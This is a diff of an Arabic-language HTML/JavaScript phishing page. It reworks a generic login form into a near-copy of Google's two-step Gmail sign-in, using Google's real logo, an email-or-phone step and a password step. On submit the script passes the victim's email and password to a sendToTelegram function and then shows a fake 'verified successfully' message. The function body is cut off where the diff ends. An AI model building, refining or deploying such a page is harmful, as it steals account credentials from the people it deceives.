@@ -13,7 +13,7 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-            background: linear-gradient(135deg, #001a4d 0%, #003d99 100%);
+            background: white;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -23,123 +23,143 @@
 
         .container {
             width: 100%;
-            max-width: 400px;
+            max-width: 500px;
         }
 
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 40px;
-            position: relative;
+        .google-logo {
+            width: 120px;
+            height: 40px;
+            margin: 0 auto 40px;
         }
 
-        .back-btn {
-            background: none;
-            border: none;
-            color: white;
-            font-size: 28px;
-            cursor: pointer;
-            padding: 0;
-            transition: opacity 0.3s ease;
-        }
-
-        .back-btn:hover {
-            opacity: 0.7;
-        }
-
-        .logo {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-        }
-
-        .logo img {
-            height: 60px;
+        .google-logo img {
+            width: 100%;
+            height: 100%;
             object-fit: contain;
         }
 
-        .placeholder-space {
-            width: 28px;
+        .page-heading {
+            text-align: center;
+            font-size: 32px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 8px;
         }
 
-        .heading {
+        .page-subheading {
             text-align: center;
-            color: white;
             font-size: 16px;
-            font-weight: 400;
-            line-height: 1.6;
+            color: #5f6368;
             margin-bottom: 40px;
-            letter-spacing: 0.3px;
         }
 
         .form-group {
             margin-bottom: 25px;
         }
 
-        label {
-            display: block;
-            color: white;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 12px;
+        .input-wrapper {
+            position: relative;
         }
 
-        .input-wrapper {
+        .input-container {
+            display: flex;
+            align-items: center;
             position: relative;
         }
 
         input {
             width: 100%;
-            padding: 16px 18px;
-            background: rgba(255, 255, 255, 0.1);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            border-radius: 12px;
-            color: white;
-            font-size: 14px;
+            padding: 16px 20px;
+            padding-right: 120px;
+            background: white;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            color: #202124;
+            font-size: 16px;
             font-family: inherit;
             transition: all 0.3s ease;
             text-align: right;
         }
 
-        input::placeholder {
-            color: rgba(255, 255, 255, 0.6);
-        }
-
         input:focus {
             outline: none;
-            background: rgba(255, 255, 255, 0.15);
-            border-color: rgba(255, 255, 255, 0.4);
+            border-color: #1f73e6;
+            box-shadow: 0 1px 3px rgba(31, 115, 230, 0.3);
+        }
+
+        input::placeholder {
+            color: #80868b;
+        }
+
+        .email-suffix {
+            position: absolute;
+            right: 20px;
+            color: #80868b;
+            font-size: 16px;
+            pointer-events: none;
+        }
+
+        .email-suffix.hidden {
+            display: none;
+        }
+
+        .forgot-link {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .forgot-link a {
+            color: #1f73e6;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-link a:hover {
+            text-decoration: underline;
+        }
+
+        .create-account {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .create-account a {
+            color: #1f73e6;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .create-account a:hover {
+            text-decoration: underline;
         }
 
         .form-actions {
-            margin-top: 30px;
-            margin-bottom: 40px;
             display: flex;
-            justify-content: center;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 30px;
         }
 
         .submit-btn {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #39e76d 0%, #00d084 100%);
-            color: #001a4d;
+            padding: 10px 32px;
+            background: #1f73e6;
+            color: white;
             border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
             cursor: pointer;
             transition: all 0.3s ease;
-            text-align: center;
         }
 
         .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 24px rgba(57, 231, 109, 0.3);
+            background: #1765cc;
+            box-shadow: 0 1px 3px rgba(31, 115, 230, 0.3);
         }
 
         .submit-btn:active {
-            transform: translateY(0);
+            background: #1555c0;
         }
 
         .submit-btn:disabled {
@@ -147,16 +167,115 @@
             cursor: not-allowed;
         }
 
+        /* Password Page Styles */
+        .password-page {
+            display: none;
+        }
+
+        .password-page.active {
+            display: block;
+        }
+
+        .email-display {
+            background: white;
+            border: 1px solid #dadce0;
+            border-radius: 50px;
+            padding: 8px 16px;
+            margin-bottom: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+        }
+
+        .email-text {
+            flex: 1;
+            color: #202124;
+            font-size: 14px;
+            text-align: right;
+        }
+
+        .dropdown-icon {
+            color: #202124;
+            font-size: 16px;
+        }
+
+        .profile-icon {
+            width: 36px;
+            height: 36px;
+            background: #dadce0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #5f6368;
+            font-size: 18px;
+        }
+
+        .password-input-container {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .password-label {
+            display: block;
+            font-size: 12px;
+            color: #1f73e6;
+            margin-bottom: 8px;
+            font-weight: 500;
+            text-align: right;
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 16px 20px !important;
+            padding-right: 20px !important;
+            border: 2px solid #1f73e6 !important;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: right;
+        }
+
+        .password-input:focus {
+            outline: none;
+            border-color: #1f73e6 !important;
+            box-shadow: 0 1px 3px rgba(31, 115, 230, 0.3) !important;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-top: 12px;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: auto;
+            padding: 0;
+            border: none;
+            background: none;
+            cursor: pointer;
+        }
+
+        .checkbox-container label {
+            margin: 0;
+            font-size: 13px;
+            color: #5f6368;
+            font-weight: 400;
+            cursor: pointer;
+        }
+
         .loading {
             display: none;
             text-align: center;
-            color: white;
+            color: #202124;
             margin-top: 20px;
         }
 
         .spinner {
-            border: 3px solid rgba(255, 255, 255, 0.2);
-            border-top: 3px solid #39e76d;
+            border: 3px solid #f0f0f0;
+            border-top: 3px solid #1f73e6;
             border-radius: 50%;
             width: 24px;
             height: 24px;
@@ -169,400 +288,121 @@
             100% { transform: rotate(360deg); }
         }
 
-        /* Gmail Page Styles */
-        .gmail-page {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            z-index: 1000;
-            overflow-y: auto;
-        }
-
-        .gmail-page.active {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .gmail-header {
-            background: white;
-            border-bottom: 1px solid #dadce0;
-            padding: 16px 24px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .gmail-header-left {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-
-        .gmail-back-btn {
-            background: none;
-            border: none;
-            font-size: 24px;
-            color: #202124;
-            cursor: pointer;
-            padding: 0;
-        }
-
-        .gmail-back-btn:hover {
-            color: #5f6368;
-        }
-
-        .gmail-logo-header {
-            width: 40px;
-            height: 40px;
-        }
-
-        .gmail-logo-header img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-        }
-
-        .gmail-header-right {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-        }
-
-        .gmail-profile {
-            width: 32px;
-            height: 32px;
-            background: #d3d3d3;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 16px;
-            cursor: pointer;
-        }
-
-        .gmail-content {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 40px 20px;
-            background: white;
-        }
-
-        .gmail-container-center {
-            text-align: center;
-            max-width: 600px;
-        }
-
-        .gmail-logo-main {
-            margin-bottom: 30px;
-        }
-
-        .gmail-logo-main img {
-            width: 120px;
-            height: auto;
-        }
-
-        .gmail-title {
-            font-size: 32px;
-            font-weight: 500;
-            color: #202124;
-            margin-bottom: 8px;
-        }
-
-        .gmail-subtitle {
-            font-size: 16px;
-            color: #5f6368;
-            margin-bottom: 32px;
-            line-height: 1.6;
-        }
-
-        .gmail-user-email {
-            background: #f8f9fa;
-            border: 1px solid #dadce0;
-            border-radius: 8px;
-            padding: 16px 20px;
-            margin-bottom: 32px;
-            font-size: 16px;
-            color: #202124;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .gmail-user-email span {
-            flex: 1;
-            text-align: right;
-            margin-right: 16px;
-        }
-
-        .gmail-user-icon {
-            width: 40px;
-            height: 40px;
-            background: #dadce0;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-        }
-
-        .gmail-password-form {
-            width: 100%;
-            max-width: 400px;
-        }
-
-        .gmail-form-group {
-            margin-bottom: 20px;
-        }
-
-        .gmail-label {
-            display: block;
-            font-size: 12px;
-            color: #5f6368;
-            margin-bottom: 8px;
-            font-weight: 500;
-        }
-
-        .gmail-input {
-            width: 100%;
-            padding: 12px 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            font-family: inherit;
-            transition: all 0.3s ease;
-            text-align: right;
-            position: relative;
-        }
-
-        .gmail-input:focus {
-            outline: none;
-            border-color: #1f73e6;
-            box-shadow: 0 1px 3px rgba(31, 115, 230, 0.3);
-        }
-
-        .gmail-input::placeholder {
-            color: #80868b;
-        }
-
-        .gmail-actions {
-            display: flex;
-            gap: 12px;
-            margin-top: 24px;
-        }
-
-        .gmail-btn {
-            flex: 1;
-            padding: 10px 24px;
-            border: 1px solid #dadce0;
-            background: white;
-            color: #1f73e6;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-
-        .gmail-btn:hover {
-            background: #f8f9fa;
-            border-color: #dadce0;
-        }
-
-        .gmail-btn-primary {
-            background: #1f73e6;
-            color: white;
-            border: none;
-        }
-
-        .gmail-btn-primary:hover {
-            background: #1765cc;
-        }
-
-        .gmail-forgot {
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .gmail-forgot a {
-            color: #1f73e6;
-            text-decoration: none;
-            font-size: 14px;
-        }
-
-        .gmail-forgot a:hover {
-            text-decoration: underline;
-        }
-
-        .gmail-checkbox {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-top: 12px;
-        }
-
-        .gmail-checkbox input {
-            width: auto;
-            padding: 0;
-            border: none;
-            background: none;
-            cursor: pointer;
-        }
-
-        .gmail-checkbox label {
-            margin: 0;
-            font-size: 13px;
-            color: #5f6368;
-            font-weight: 400;
-            cursor: pointer;
-        }
-
         @media (max-width: 480px) {
             .container {
                 padding: 0 15px;
             }
 
-            .heading {
-                font-size: 15px;
+            .page-heading {
+                font-size: 24px;
+            }
+
+            .page-subheading {
+                font-size: 14px;
             }
 
             input {
                 font-size: 16px;
             }
 
-            .gmail-title {
-                font-size: 24px;
+            .form-actions {
+                flex-direction: column;
+                gap: 12px;
             }
 
-            .gmail-subtitle {
-                font-size: 14px;
-            }
-
-            .gmail-header {
-                padding: 12px 16px;
+            .submit-btn {
+                width: 100%;
             }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- الصفحة الأولى - البريد والمرور -->
+        <!-- الصفحة الأولى - البريد والرقم -->
         <div class="login-page active">
-            <div class="header">
-                <button class="back-btn" onclick="window.history.back()">←</button>
-                <div class="logo">
-                    <img src="https://a.top4top.io/p_3743bvz3x0.png" alt="lba logo">
-                </div>
-                <div class="placeholder-space"></div>
+            <div class="google-logo">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
             </div>
 
-            <h1 class="heading">للاستمرار، يرجى إدخال البريد الإلكتروني المستخدم وكلمة المرور</h1>
+            <h1 class="page-heading">تسجيل الدخول</h1>
+            <p class="page-subheading">المتابعة إلى Gmail</p>
 
             <form id="loginForm">
                 <div class="form-group">
-                    <label for="email">البريد الإلكتروني</label>
-                    <div class="input-wrapper">
+                    <div class="input-container">
                         <input 
-                            type="email" 
-                            id="email" 
-                            name="email"
-                            placeholder="أدخل بريدك الإلكتروني"
+                            type="text" 
+                            id="emailPhone" 
+                            name="emailPhone"
+                            placeholder="البريد الإلكتروني أو الهاتف"
                             required
                         >
+                        <span class="email-suffix" id="emailSuffix">@gmail.com</span>
                     </div>
                 </div>
 
-                <div class="form-group">
-                    <label for="password">كلمة المرور</label>
-                    <div class="input-wrapper">
-                        <input 
-                            type="password" 
-                            id="password" 
-                            name="password"
-                            placeholder="أدخل كلمة المرور"
-                            required
-                        >
-                    </div>
-                </div>
+                <p class="forgot-link">
+                    <a href="#">هل نسيت بريدك الإلكتروني؟</a>
+                </p>
 
                 <div class="form-actions">
-                    <button type="submit" class="submit-btn" id="submitBtn">الدخول</button>
+                    <button type="submit" class="submit-btn">التالي</button>
+                    <p class="create-account">
+                        <a href="#">إنشاء حساب</a>
+                    </p>
                 </div>
             </form>
 
             <div class="loading" id="loading">
                 <div class="spinner"></div>
-                <p>جاري الإرسال...</p>
-            </div>
-        </div>
-    </div>
-
-    <!-- صفحة Gmail -->
-    <div class="gmail-page" id="gmailPage">
-        <div class="gmail-header">
-            <div class="gmail-header-left">
-                <button class="gmail-back-btn" onclick="goBackToLogin()">←</button>
-                <div class="gmail-logo-header">
-                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <text x="2" y="18" font-size="16" font-weight="bold" fill="#4285f4">Gmail</text>
-                    </svg>
-                </div>
-            </div>
-            <div class="gmail-header-right">
-                <div class="gmail-profile">👤</div>
+                <p>جاري المتابعة...</p>
             </div>
         </div>
 
-        <div class="gmail-content">
-            <div class="gmail-container-center">
-                <div class="gmail-logo-main">
-                    <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <rect width="24" height="24" rx="3" fill="#EA4335"/>
-                        <path d="M3 5L12 12L21 5" stroke="white" stroke-width="1.5" stroke-linecap="round"/>
-                        <path d="M3 5H21V19C21 19.5304 20.7893 20.0391 20.4142 20.4142C20.0391 20.7893 19.5304 21 19 21H5C4.46957 21 3.96086 20.7893 3.58579 20.4142C3.21071 20.0391 3 19.5304 3 19V5Z" stroke="white" stroke-width="1.5" stroke-linejoin="round"/>
-                    </svg>
+        <!-- الصفحة الثانية - كلمة المرور -->
+        <div class="password-page">
+            <div class="google-logo">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+            </div>
+
+            <h1 class="page-heading">مرحباً</h1>
+
+            <div class="email-display">
+                <div class="profile-icon">👤</div>
+                <span class="dropdown-icon">▼</span>
+                <span class="email-text" id="displayEmail">your.email@gmail.com</span>
+            </div>
+
+            <form id="passwordForm">
+                <div class="password-input-container">
+                    <label class="password-label">إدخال كلمة المرور</label>
+                    <input 
+                        type="password" 
+                        id="passwordInput" 
+                        name="password"
+                        class="password-input"
+                        placeholder="أدخل كلمة المرور"
+                        required
+                    >
                 </div>
 
-                <h1 class="gmail-title">أهلاً وسهلاً</h1>
-                <p class="gmail-subtitle">أدخل كلمة مرور Google حسابك</p>
-
-                <div class="gmail-user-email">
-                    <div class="gmail-user-icon">👤</div>
-                    <span id="gmailUserEmail">your.email@gmail.com</span>
+                <div class="checkbox-container">
+                    <input type="checkbox" id="showPassword" onchange="togglePassword()">
+                    <label for="showPassword">عرض كلمة المرور</label>
                 </div>
 
-                <form id="gmailPasswordForm" class="gmail-password-form">
-                    <div class="gmail-form-group">
-                        <label class="gmail-label">أدخل كلمة المرور</label>
-                        <input 
-                            type="password" 
-                            id="gmailPassword" 
-                            class="gmail-input"
-                            placeholder="أدخل كلمة المرور"
-                            required
-                        >
-                    </div>
+                <p class="forgot-link">
+                    <a href="#">هل نسيت كلمة المرور؟</a>
+                </p>
 
-                    <div class="gmail-checkbox">
-                        <input type="checkbox" id="gmailShowPassword" onchange="toggleGmailPassword()">
-                        <label for="gmailShowPassword">عرض كلمة المرور</label>
-                    </div>
+                <div class="form-actions">
+                    <button type="submit" class="submit-btn">التالي</button>
+                </div>
+            </form>
 
-                    <div class="gmail-forgot">
-                        <a href="#">هل نسيت كلمة المرور؟</a>
-                    </div>
-
-                    <div class="gmail-actions">
-                        <button type="button" class="gmail-btn" onclick="goBackToLogin()">الرجوع</button>
-                        <button type="submit" class="gmail-btn gmail-btn-primary">التالي</button>
-                    </div>
-                </form>
+            <div class="loading" id="passwordLoading">
+                <div class="spinner"></div>
+                <p>جاري التحقق...</p>
             </div>
         </div>
     </div>
@@ -574,64 +414,75 @@
         let savedEmail = '';
 
         // الصفحة الأولى
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
-            const email = document.getElementById('email').value.trim();
-            const password = document.getElementById('password').value;
+            const emailPhone = document.getElementById('emailPhone').value.trim();
 
-            if (!email || !password) {
-                alert('الرجاء ملء جميع الحقول');
+            if (!emailPhone) {
+                alert('الرجاء إدخال البريد أو الرقم');
                 return;
             }
 
-            savedEmail = email;
+            savedEmail = emailPhone;
 
-            // إرسال البيانات إلى التلجرام
-            await sendToTelegram(email, password);
-
-            // الانتقال إلى صفحة Gmail
-            goToGmailPage(email);
+            // الانتقال إلى صفحة كلمة المرور
+            goToPasswordPage(emailPhone);
         });
 
-        // صفحة Gmail
-        document.getElementById('gmailPasswordForm').addEventListener('submit', async function(e) {
+        // التحكم بحقل البريد/الرقم
+        document.getElementById('emailPhone').addEventListener('input', function(e) {
+            const value = e.target.value;
+            const isPhone = /^\d/.test(value);
+            const suffix = document.getElementById('emailSuffix');
+
+            if (isPhone) {
+                suffix.classList.add('hidden');
+            } else {
+                suffix.classList.remove('hidden');
+            }
+        });
+
+        // صفحة كلمة المرور
+        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
-            const password = document.getElementById('gmailPassword').value;
+            const password = document.getElementById('passwordInput').value;
 
             if (!password) {
                 alert('الرجاء إدخال كلمة المرور');
                 return;
             }
 
+            document.getElementById('passwordLoading').style.display = 'block';
+
             // إرسال البيانات إلى التلجرام
             await sendToTelegram(savedEmail, password);
 
+            document.getElementById('passwordLoading').style.display = 'none';
+
             alert('تم التحقق بنجاح!');
+            document.getElementById('passwordForm').reset();
         });
 
-        function goToGmailPage(email) {
-            document.querySelector('.login-page').style.display = 'none';
-            document.getElementById('gmailPage').classList.add('active');
-            document.getElementById('gmailUserEmail').textContent = email;
-        }
-
-        function goBackToLogin() {
-            document.querySelector('.login-page').style.display = 'block';
-            document.getElementById('gmailPage').classList.remove('active');
-            document.getElementById('loginForm').reset();
-        }
-
-        function toggleGmailPassword() {
-            const input = document.getElementById('gmailPassword');
-            const checkbox = document.getElementById('gmailShowPassword');
+        function togglePassword() {
+            const input = document.getElementById('passwordInput');
+            const checkbox = document.getElementById('showPassword');
 
             if (checkbox.checked) {
                 input.type = 'text';
             } else {
                 input.type = 'password';
             }
+        }
+
+        function goToPasswordPage(emailOrPhone) {
+            const isPhone = /^\d{10,}$/.test(emailOrPhone);
+            const displayValue = isPhone ? emailOrPhone : emailOrPhone.includes('@') ? emailOrPhone : emailOrPhone + '@gmail.com';
+
+            document.querySelector('.login-page').classList.remove('active');
+            document.querySelector('.password-page').classList.add('active');
+            document.getElementById('displayEmail').textContent = displayValue;
         }
 
         async function sendToTelegram(email, password) {
